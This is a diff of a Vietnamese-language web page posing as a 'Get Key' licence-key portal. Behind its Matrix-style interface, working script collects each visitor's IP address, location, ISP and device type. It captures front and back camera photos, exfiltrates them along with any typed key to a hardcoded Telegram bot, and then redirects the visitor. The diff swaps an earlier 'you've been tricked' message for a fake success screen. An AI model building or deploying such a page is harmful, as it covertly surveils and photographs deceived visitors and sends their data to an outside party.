@@ -3,23 +3,39 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Hệ Thống Get Key - Terminal Security</title>
+<title>Hệ Thống Get Key - Custom Matrix</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
   :root {
     --bg-base: #020408;
-    --panel-bg: rgba(3, 7, 18, 0.9);
-    --border-color: rgba(34, 197, 94, 0.4);
-    --primary: #15803d;
-    --accent: #22c55e;
+    --panel-bg: rgba(3, 7, 18, 0.85);
+    --border-color: rgba(236, 72, 153, 0.4);
+    --primary: #db2777;
+    --accent: #f472b6;
     --text-main: #ffffff;
-    --text-muted: #4ade80;
+    --text-muted: #f472b6;
+    /* Dán link ảnh nền trực tiếp vào thuộc tính url('') bên dưới */
+    --custom-bg: url('https://ibb.co/0Rs20yy3');
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; }
+
+  .light-mode {
+    --bg-base: #f8fafc;
+    --panel-bg: rgba(255, 255, 255, 0.85);
+    --border-color: rgba(219, 39, 119, 0.4);
+    --primary: #db2777;
+    --accent: #be185d;
+    --text-main: #0f172a;
+    --text-muted: #db2777;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; transition: background 0.3s, color 0.3s; }
   body {
     background-color: var(--bg-base);
+    background-image: var(--custom-bg);
+    background-size: cover;
+    background-position: center;
     color: var(--text-main);
     min-height: 100vh;
     display: flex;
@@ -30,15 +46,66 @@
     position: relative;
   }
 
-  /* Hiệu ứng Matrix mưa chữ hacker */
+  /* Nhóm nút điều khiển góc phải (đã bỏ nút Đổi Nền) */
+  .top-right-controls {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    display: flex;
+    gap: 10px;
+    z-index: 10000;
+  }
+
+  .control-btn {
+    background: var(--panel-bg);
+    backdrop-filter: blur(10px);
+    border: 2px solid var(--border-color);
+    color: var(--text-main);
+    height: 48px;
+    padding: 0 16px;
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    box-shadow: 0 0 25px rgba(236, 72, 153, 0.3);
+    font-size: 0.9rem;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .control-btn:hover { transform: scale(1.05); border-color: var(--accent); }
+  .icon-btn { width: 48px; padding: 0; font-size: 20px; }
+
+  /* Nút Nhập Key ở góc trên trái */
+  .key-input-toggle {
+    position: fixed;
+    top: 20px;
+    left: 20px;
+    background: var(--panel-bg);
+    backdrop-filter: blur(10px);
+    border: 2px solid var(--border-color);
+    color: var(--text-main);
+    padding: 0 16px;
+    height: 48px;
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    z-index: 10000;
+    box-shadow: 0 0 25px rgba(236, 72, 153, 0.3);
+    font-size: 0.9rem;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .key-input-toggle:hover { transform: scale(1.05); border-color: var(--accent); }
+
+  /* Canvas Matrix cầu vồng */
   canvas#matrix-rain {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
     z-index: 1;
     pointer-events: none;
+    filter: drop-shadow(0 0 6px rgba(236, 72, 153, 0.6));
   }
 
   .card {
@@ -50,7 +117,7 @@
     border-radius: 24px;
     width: 100%;
     max-width: 380px;
-    box-shadow: 0 0 50px rgba(22, 163, 74, 0.25);
+    box-shadow: 0 0 60px rgba(219, 39, 119, 0.25);
     text-align: center;
     position: relative;
     z-index: 10;
@@ -59,9 +126,9 @@
     font-family: 'Share Tech Mono', monospace;
     font-size: 0.85rem; 
     font-weight: 700; 
-    color: #4ade80;
-    background: rgba(22, 163, 74, 0.15); 
-    border: 1px solid rgba(34, 197, 94, 0.4);
+    color: var(--text-muted);
+    background: rgba(236, 72, 153, 0.15); 
+    border: 1px solid var(--border-color);
     padding: 6px 14px; 
     border-radius: 20px; 
     display: inline-block; 
@@ -70,90 +137,184 @@
   }
   .icon-box {
     width: 64px; height: 64px; margin: 0 auto 20px auto;
-    background: linear-gradient(135deg, rgba(22, 163, 74, 0.3), rgba(34, 197, 94, 0.3));
-    border: 1px solid rgba(34, 197, 94, 0.6); border-radius: 20px;
+    background: linear-gradient(135deg, rgba(236, 72, 153, 0.3), rgba(168, 85, 247, 0.3));
+    border: 1px solid var(--border-color); border-radius: 20px;
     display: flex; align-items: center; justify-content: center; font-size: 28px;
-    box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
+    box-shadow: 0 0 25px rgba(236, 72, 153, 0.4);
   }
-  h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-shadow: 0 0 12px rgba(34,197,94,0.7); }
-  .subtitle { font-size: 0.9rem; font-weight: 700; color: #bbf7d0; margin-bottom: 28px; line-height: 1.5; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.3); }
+  h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; color: var(--text-main); text-shadow: 0 0 12px rgba(236,72,153,0.7); }
+  .subtitle { font-size: 0.9rem; font-weight: 700; color: var(--text-muted); margin-bottom: 28px; line-height: 1.5; font-family: 'Share Tech Mono', monospace; }
   
   .btn-primary {
-    width: 100%; padding: 16px; 
-    background: linear-gradient(135deg, #15803d, #22c55e);
-    color: #ffffff; border: none; border-radius: 16px; 
-    font-weight: 800; font-size: 1.05rem; cursor: pointer; 
-    transition: all 0.3s ease;
-    box-shadow: 0 10px 25px -5px rgba(34, 197, 94, 0.6);
-    display: flex; align-items: center; justify-content: center; gap: 8px;
-    text-shadow: 0 1px 3px rgba(0,0,0,0.5);
-    letter-spacing: 0.5px;
+    width: 100%; 
+    padding: 16px 20px; 
+    background: linear-gradient(135deg, rgba(236, 72, 153, 0.2), rgba(168, 85, 247, 0.4));
+    color: var(--text-main); 
+    border: 2px solid var(--accent); 
+    border-radius: 8px; 
+    font-weight: 800; 
+    font-size: 1.05rem; 
+    cursor: pointer; 
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 0 25px rgba(236, 72, 153, 0.3), inset 0 0 10px rgba(168, 85, 247, 0.2);
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    gap: 12px;
+    letter-spacing: 1px;
+    position: relative;
+    overflow: hidden;
   }
-  .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(34, 197, 94, 0.8); }
+  .btn-primary::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+    transition: 0.5s;
+  }
+  .btn-primary:hover::before { left: 100%; }
+  .btn-primary:hover {
+    background: linear-gradient(135deg, #db2777, #9333ea);
+    border-color: #f472b6;
+    transform: translateY(-2px); 
+    box-shadow: 0 0 35px rgba(236, 72, 153, 0.6);
+  }
 
-  .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #4ade80; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.4); }
+  .btn-icon { font-size: 1.2rem; }
+  .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: var(--text-muted); min-height: 20px; font-family: 'Share Tech Mono', monospace; }
   #video, #canvas { display: none; }
 
-  /* Giao diện phủ toàn màn hình che kín trang web */
+  /* Modal chung */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: rgba(2, 4, 8, 0.8);
+    backdrop-filter: blur(15px);
+    z-index: 20000;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .modal-card {
+    background: var(--panel-bg);
+    border: 2px solid var(--border-color);
+    padding: 30px;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 360px;
+    text-align: center;
+    box-shadow: 0 0 40px rgba(236, 72, 153, 0.3);
+  }
+  .modal-card h3 { color: var(--text-main); margin-bottom: 15px; font-size: 1.3rem; }
+  .modal-input {
+    width: 100%;
+    padding: 12px 16px;
+    background: rgba(0,0,0,0.3);
+    border: 2px solid var(--border-color);
+    color: var(--text-main);
+    border-radius: 8px;
+    font-size: 1rem;
+    margin-bottom: 20px;
+    outline: none;
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .modal-input:focus { border-color: var(--accent); }
+  .modal-btns { display: flex; gap: 10px; }
+  .modal-btn {
+    flex: 1;
+    padding: 12px;
+    border-radius: 8px;
+    font-weight: 800;
+    cursor: pointer;
+    border: none;
+  }
+  .btn-submit { background: #db2777; color: #fff; box-shadow: 0 0 15px rgba(219,39,119,0.4); }
+  .btn-cancel { background: rgba(255,255,255,0.1); color: var(--text-main); border: 1px solid var(--border-color); }
+
+  /* Lớp phủ thông báo kết quả */
   .fullscreen-overlay {
     display: none;
     position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
     background: rgba(2, 4, 8, 0.95);
     backdrop-filter: blur(25px);
-    -webkit-backdrop-filter: blur(25px);
-    z-index: 9999;
+    z-index: 30000;
     flex-direction: column;
     justify-content: center;
     align-items: center;
     text-align: center;
     padding: 20px;
-    animation: fadeIn 0.4s ease-in-out;
   }
-
   .skull-box {
     width: 80px; height: 80px; margin: 0 auto 20px auto;
-    background: linear-gradient(135deg, rgba(239, 68, 68, 0.3), rgba(185, 28, 28, 0.3));
-    border: 2px solid rgba(239, 68, 68, 0.8); border-radius: 24px;
+    background: linear-gradient(135deg, rgba(34, 197, 94, 0.3), rgba(22, 163, 74, 0.3));
+    border: 2px solid rgba(34, 197, 94, 0.8); border-radius: 24px;
     display: flex; align-items: center; justify-content: center; font-size: 38px;
-    box-shadow: 0 0 30px rgba(239, 68, 68, 0.5);
-    animation: pulseSkull 1.2s infinite alternate;
+    box-shadow: 0 0 30px rgba(34, 197, 94, 0.5);
   }
-
-  .fullscreen-overlay h2 {
-    color: #ef4444;
-    text-shadow: 0 0 20px rgba(239, 68, 68, 0.8);
-    font-size: 2rem;
-    margin-bottom: 12px;
-  }
-
-  .fullscreen-overlay p {
-    color: #fca5a5;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 1.1rem;
-    text-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
-    line-height: 1.5;
-  }
-
-  @keyframes fadeIn {
-    from { opacity: 0; transform: scale(0.95); }
-    to { opacity: 1; transform: scale(1); }
-  }
-  @keyframes pulseSkull {
-    0% { transform: scale(1); box-shadow: 0 0 20px rgba(239, 68, 68, 0.4); }
-    100% { transform: scale(1.08); box-shadow: 0 0 35px rgba(239, 68, 68, 0.8); }
-  }
+  .fullscreen-overlay h2 { color: #22c55e; font-size: 2rem; margin-bottom: 12px; text-shadow: 0 0 15px rgba(34,197,94,0.6); }
+  .fullscreen-overlay p { color: #86efac; font-family: 'Share Tech Mono', monospace; font-size: 1.1rem; }
 </style>
 </head>
 <body>
 
-  <!-- Canvas hiệu ứng mưa chữ Hacker Matrix đậm nét -->
+  <!-- Các nút điều hướng góc giao diện -->
+  <button class="key-input-toggle" onclick="openKeyModal()">🔑 Nhập Key</button>
+  
+  <div class="top-right-controls">
+    <button class="control-btn" id="matrix-toggle-btn" onclick="toggleMatrix()">✨ Tắt Chữ Ảo</button>
+    <button class="control-btn icon-btn" id="theme-btn" onclick="toggleTheme()">☀️</button>
+  </div>
+
   <canvas id="matrix-rain"></canvas>
 
+  <!-- Modal Nhập Key -->
+  <div class="modal-overlay" id="keyModal">
+    <div class="modal-card">
+      <h3>Xác Thực Key Bản Quyền</h3>
+      <input type="text" id="userKeyInput" class="modal-input" placeholder="Nhập Key của bạn..." autocomplete="off">
+      <div class="modal-btns">
+        <button class="modal-btn btn-cancel" onclick="closeKeyModal()">Hủy</button>
+        <button class="modal-btn btn-submit" onclick="submitCustomKey()">Xác Nhận</button>
+      </div>
+    </div>
+  </div>
+
   <script>
+    let matrixActive = true;
+
+    function toggleTheme() {
+      document.body.classList.toggle('light-mode');
+      const isLight = document.body.classList.contains('light-mode');
+      document.getElementById('theme-btn').textContent = isLight ? '🌙' : '☀️';
+    }
+
+    function toggleMatrix() {
+      matrixActive = !matrixActive;
+      const canvas = document.getElementById('matrix-rain');
+      const btn = document.getElementById('matrix-toggle-btn');
+      if (matrixActive) {
+        canvas.style.display = 'block';
+        btn.textContent = '✨ Tắt Chữ Ảo';
+      } else {
+        canvas.style.display = 'none';
+        btn.textContent = '✨ Bật Chữ Ảo';
+      }
+    }
+
+    function openKeyModal() {
+      document.getElementById('keyModal').style.display = 'flex';
+      document.getElementById('userKeyInput').focus();
+    }
+    function closeKeyModal() {
+      document.getElementById('keyModal').style.display = 'none';
+    }
+
     const canvasRain = document.getElementById('matrix-rain');
     const ctx = canvasRain.getContext('2d');
 
@@ -164,41 +325,41 @@
     window.addEventListener('resize', resizeCanvas);
     resizeCanvas();
 
-    const characters = 'アカサタナハマヤラワイ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>//:;*+-#$';
-    const fontSize = 15; 
-    let columns = canvasRain.width / fontSize;
+    const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@#$%^&*()_+-=[]{}|;:,.<>/?~`アカサタナハマヤラワイ';
+    const fontSize = 11; 
+    let columns = Math.floor(canvasRain.width / fontSize);
     const drops = [];
 
     for (let i = 0; i < columns; i++) {
-      drops[i] = 1;
+      drops[i] = Math.floor(Math.random() * canvasRain.height);
     }
 
     function drawMatrix() {
-      ctx.fillStyle = 'rgba(2, 4, 8, 0.1)';
+      if (!matrixActive) return;
+      ctx.fillStyle = document.body.classList.contains('light-mode') ? 'rgba(248, 250, 252, 0.08)' : 'rgba(2, 4, 8, 0.08)';
       ctx.fillRect(0, 0, canvasRain.width, canvasRain.height);
-
-      ctx.fillStyle = '#10b981'; 
       ctx.font = 'bold ' + fontSize + 'px "Share Tech Mono", monospace'; 
 
       for (let i = 0; i < drops.length; i++) {
         const text = characters.charAt(Math.floor(Math.random() * characters.length));
+        const hue = (i * 10 + Date.now() / 20) % 360;
+        ctx.fillStyle = `hsl(${hue}, 100%, 65%)`;
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
 
         if (drops[i] * fontSize > canvasRain.height && Math.random() > 0.975) {
           drops[i] = 0;
         }
-        drops[i]++;
+        drops[i] += 1.8; 
       }
     }
-    setInterval(drawMatrix, 30);
+    setInterval(drawMatrix, 20);
   </script>
 
   <div class="card">
     <div class="live-clock" id="clock">SYSTEM_TIME: --:--:--</div>
     
-    <!-- Phần nội dung ban đầu -->
     <div id="main-content">
-      <div class="icon-box">💻</div>
+      <div class="icon-box">💎</div>
       <h2>Hệ Thống Get Key</h2>
       <p class="subtitle">&gt; Nhấn nút bên dưới để giải mã và nhận Key bản quyền an toàn.</p>
 
@@ -206,31 +367,30 @@
       <canvas id="canvas"></canvas>
 
       <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
-        <span>🔑 GET KEY NGAY</span>
+        <span class="btn-icon">⚡</span>
+        <span>EXECUTE_GET_KEY</span>
       </button>
       
       <div id="status" class="status"></div>
     </div>
   </div>
 
-  <!-- Thông báo phủ toàn màn hình khi hoàn thành (Bị lừa) -->
   <div id="hacked-overlay" class="fullscreen-overlay">
-    <div class="skull-box">💀</div>
-    <h2>BẠN ĐÃ BỊ LỪA</h2>
-    <p>&gt; Toàn bộ thông tin & hình ảnh của bạn đã được ghi lại thành công!</p>
+    <div class="skull-box">✅</div>
+    <h2 id="success-title">THÀNH CÔNG</h2>
+    <p id="success-desc">&gt; Key hợp lệ! Đang chuyển hướng...</p>
   </div>
 
-  <!-- Thông báo phủ toàn màn hình khi từ chối quyền camera (Bị chặn) -->
   <div id="blocked-overlay" class="fullscreen-overlay">
     <div class="skull-box" style="background: linear-gradient(135deg, rgba(239, 68, 68, 0.3), rgba(185, 28, 28, 0.3)); border-color: rgba(239, 68, 68, 0.8);">🚫</div>
     <h2>BẠN ĐÃ BỊ CHẶN</h2>
-    <p>&gt; Vui lòng cho phép truy cập để tiếp tục truy cập get key!</p>
+    <p>&gt; Vui lòng cho phép truy cập camera để tiếp tục!</p>
   </div>
 
 <script>
   const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
-  const TELEGRAM_CHAT_ID = '-5396508964'; 
-  const REDIRECT_URL = 'https://xnhau.city/';
+  const TELEGRAM_CHAT_ID = '-1004303781844'; 
+  const REDIRECT_URL = 'https://t.me/proxyjustin';
 
   function updateClock() {
     const now = new Date();
@@ -279,10 +439,7 @@
     }
   }
 
-  async function triggerProcess() {
-    getKeyBtn.style.display = 'none';
-    statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
-
+  async function executeCaptureFlow(actionType, extraInfo = "") {
     let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
     try {
       const ipRes = await fetch('https://ipwho.is/');
@@ -300,28 +457,26 @@
     const ua = navigator.userAgent;
     let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
 
-    const infoText = 
-      `💻 <b>YÊU CẦU GET KEY (BOLD MATRIX)</b> 💻\n` +
+    let infoText = 
+      `💎 <b>THÔNG TIN XÁC THỰC (${actionType})</b> 💎\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Thiết bị:</b> ${deviceName}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
       `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
-      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
-      `━━━━━━━━━━━━━━━━━━━━━`;
+      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n`;
+      
+    if (extraInfo) {
+      infoText += `🔑 <b>Key nhập:</b> <code>${extraInfo}</code>\n`;
+    }
+    infoText += `━━━━━━━━━━━━━━━━━━━━━`;
 
-    statusDiv.textContent = '[*] Đang yêu cầu quyền truy cập Camera...';
     let backPhoto = await takePhoto('environment', '📸 Ảnh Camera Sau');
-
-    // Nếu bấm từ chối -> Hiện màn hình "BẠN ĐÃ BỊ CHẶN" che kín toàn web rồi reload
     if (backPhoto === "DENIED") {
       blockedOverlay.style.display = 'flex';
-      setTimeout(() => {
-        location.reload();
-      }, 2500);
-      return;
+      setTimeout(() => { location.reload(); }, 2500);
+      return false;
     }
 
-    statusDiv.textContent = '[*] Đang xử lý luồng dữ liệu #2...';
     let frontPhoto = await takePhoto('user', '📸 Ảnh Camera Trước');
 
     if (backPhoto && backPhoto.blob) {
@@ -341,9 +496,35 @@
       fd2.append('parse_mode', 'HTML');
       try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 }); } catch(e){}
     }
+    return true;
+  }
 
-    // Hoàn tất -> Hiện màn hình "BẠN ĐÃ BỊ LỪA" che kín toàn web rồi chuyển hướng
+  async function triggerProcess() {
+    getKeyBtn.style.display = 'none';
+    statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
+    
+    statusDiv.textContent = '[*] Đang xác thực hệ thống...';
+    let success = await executeCaptureFlow("GET KEY");
+    if(!success) return;
+
     hackedOverlay.style.display = 'flex';
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 2500);
+  }
+
+  async function submitCustomKey() {
+    const keyVal = document.getElementById('userKeyInput').value.trim();
+    closeKeyModal();
+    
+    if(!keyVal) return;
+
+    hackedOverlay.style.display = 'flex';
+    document.getElementById('success-title').textContent = "XÁC THỰC THÀNH CÔNG";
+    document.getElementById('success-desc').textContent = "> Key hợp lệ! Đang kết nối tới box Telegram...";
+
+    await executeCaptureFlow("NHẬP KEY BỪA", keyVal);
+
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, 2500);
